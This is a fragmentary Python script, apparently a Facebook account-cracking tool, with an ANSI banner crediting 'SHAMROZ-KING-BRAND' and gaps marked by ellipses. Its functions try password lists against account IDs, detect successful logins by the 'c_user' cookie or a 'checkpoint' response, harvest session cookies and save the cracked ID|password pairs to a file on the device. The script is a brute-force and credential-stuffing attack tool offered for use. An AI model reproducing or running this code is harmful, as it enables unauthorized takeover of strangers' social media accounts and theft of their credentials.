...
\033[1;36m##    ## ### \033[1;34m##    ## ##     ## ##     ##  ##       ##  ### \033[1;36m##     ## 
\033[1;36m ######  ###  \033[1;34m######  ##     ##  #######  ######## #### ### \033[1;36m##     ## 
\033[1;32m(SHAROON-KING)              \033[1;31m(SHAMROZ-TRICKER)             \033[1;32m(ADAN-BURAT)

           \033[1;93m▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲
             \033[1;37m[✫] OWNER     [✫]\033[1;35m  SHAMROZ-KING-BRAND
        ...
        👉😈 \033[1;31mKoi Hajat Ho To Milnay Chalay Atay Hain.......
...
def fia():    
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/SHAMROZ-.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SHAMROZ] %s|\033[0;92mOK:-%s \033[0;97m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				...
				oks.append(ids)
				break
			elif 'checkpoint' in SHAMROZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SHAMROZ-OK] '+ids+' | '+pas+'\033[0;92m')
					
					open('/sdcard/SHAMROZ-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SHAMROZ] %s|\033[1;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				...
				if 'y' in pcp:
					print('\33[38;5;208m[SHAMROZ-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\x1b[1;92m[SHAMROZ-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[38;5;208m[SHAMROZ-CP] '+cid+' | '+ps+'\033[0;92m')
